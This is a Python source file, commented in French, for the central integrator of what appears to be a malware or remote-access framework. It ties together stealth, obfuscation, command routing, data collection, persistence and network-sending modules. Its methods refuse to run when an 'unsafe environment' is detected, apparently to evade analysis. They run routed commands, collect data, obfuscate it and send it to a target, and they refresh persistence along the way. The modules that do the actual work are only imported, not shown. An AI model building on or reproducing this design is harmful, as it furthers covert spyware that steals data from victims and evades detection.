import logging
from typing import Optional, Dict, Any
from core.resilience import ResilienceManager, ErrorCategory, ErrorSeverity
from core.brain import BehaviorAnalyzer
from core.stealth import StealthManager
from core.obfuscator import CodeObfuscator
from modules.router import CommandRouter
from modules.network import NetworkManager
from modules.collector import DataCollector
from modules.persistence import PersistenceManager

class SystemIntegrator:
    """Intégrateur central pour tous les composants du framework"""
    
    def __init__(self):
        self.logger = logging.getLogger('SystemIntegrator')
        
        # Initialisation des managers
        self.resilience = ResilienceManager()
        self.brain = BehaviorAnalyzer()
        self.stealth = StealthManager()
        self.obfuscator = CodeObfuscator()
        self.router = CommandRouter()
        self.network = NetworkManager()
        self.collector = DataCollector()
        self.persistence = PersistenceManager()
        
        # Enregistrement des gestionnaires d'erreurs
        self._register_error_handlers()
        
    def initialize(self):
        """Initialise tous les composants avec gestion de la résilience"""
        try:
            # Démarre la surveillance de la résilience
            self.resilience.start_monitoring()
            
            # Initialise les composants avec gestion d'erreurs
            self._init_component(self.brain.initialize, ErrorCategory.PROCESS)
            self._init_component(self.stealth.initialize, ErrorCategory.SECURITY)
            self._init_component(self.network.initialize, ErrorCategory.NETWORK)
            self._init_component(self.collector.initialize, ErrorCategory.RESOURCE)
            self._init_component(self.persistence.initialize, ErrorCategory.FILESYSTEM)
            self._init_component(self.router.initialize, ErrorCategory.PROCESS)
            
            self.logger.info("All components initialized successfully")
            return True
        except Exception as e:
            self.logger.error(f"Initialization failed: {str(e)}")
            self.resilience.handle_error(e, ErrorCategory.PROCESS, ErrorSeverity.HIGH)
            return False
            
    def _init_component(self, init_func, error_category: ErrorCategory):
        """Initialise un composant avec gestion de la résilience"""
        try:
            init_func()
        except Exception as e:
            self.resilience.handle_error(e, error_category, ErrorSeverity.MEDIUM)
            
    def _register_error_handlers(self):
        """Enregistre les gestionnaires d'erreurs pour chaque catégorie"""
        
        # Gestionnaire d'erreurs réseau
        self.resilience.register_error_handler(
            ErrorCategory.NETWORK,
            lambda error: self.network.handle_network_error(error)
        )
        
        # Gestionnaire d'erreurs système de fichiers
        self.resilience.register_error_handler(
            ErrorCategory.FILESYSTEM,
            lambda error: self.persistence.handle_filesystem_error(error)
        )
        
        # Gestionnaire d'erreurs de processus
        self.resilience.register_error_handler(
            ErrorCategory.PROCESS,
            lambda error: self.brain.handle_process_error(error)
        )
        
        # Gestionnaire d'erreurs de sécurité
        self.resilience.register_error_handler(
            ErrorCategory.SECURITY,
            lambda error: self.stealth.handle_security_error(error)
        )
        
    def execute_command(self, command: str, params: Optional[Dict[str, Any]] = None):
        """Exécute une commande avec gestion de la résilience"""
        try:
            # Vérifie la furtivité avant l'exécution
            if not self.stealth.check_environment():
                raise Exception("Unsafe environment detected")
                
            # Route la commande
            result = self.router.route_command(command, params)
            
            # Analyse le comportement
            self.brain.analyze_execution(command, result)
            
            # Met à jour la persistance si nécessaire
            self.persistence.update_if_needed()
            
            return result
        except Exception as e:
            self.resilience.handle_error(e, ErrorCategory.PROCESS, ErrorSeverity.MEDIUM)
            return None
            
    def collect_data(self, data_type: str):
        """Collecte des données avec gestion de la résilience"""
        try:
            # Vérifie la furtivité
            if not self.stealth.check_environment():
                raise Exception("Unsafe environment detected")
                
            # Collecte les données
            data = self.collector.collect(data_type)
            
            # Obfusque les données sensibles
            data = self.obfuscator.obfuscate_data(data)
            
            # Analyse les données
            self.brain.analyze_data(data)
            
            return data
        except Exception as e:
            self.resilience.handle_error(e, ErrorCategory.RESOURCE, ErrorSeverity.MEDIUM)
            return None
            
    def send_data(self, data: Any, target: str):
        """Envoie des données avec gestion de la résilience"""
        try:
            # Vérifie la furtivité
            if not self.stealth.check_environment():
                raise Exception("Unsafe environment detected")
                
            # Obfusque les données
            data = self.obfuscator.obfuscate_data(data)
            
            # Envoie les données
            result = self.network.send_data(data, target)
            
            # Analyse le résultat
            self.brain.analyze_network_operation(result)
            
            return result
        except Exception as e:
            self.resilience.handle_error(e, ErrorCategory.NETWORK, ErrorSeverity.MEDIUM)
            return None
            
    def shutdown(self):
        """Arrête proprement tous les composants"""
        try:
            self.resilience.stop_monitoring()
            self.network.shutdown()
            self.collector.shutdown()
            self.persistence.shutdown()
            self.brain.shutdown()
            self.stealth.shutdown()
            self.logger.info("All components shut down successfully")
        except Exception as e:
            self.logger.error(f"Shutdown failed: {str(e)}")
            # Force l'arrêt en cas d'erreur
            import sys
            sys.exit(1)
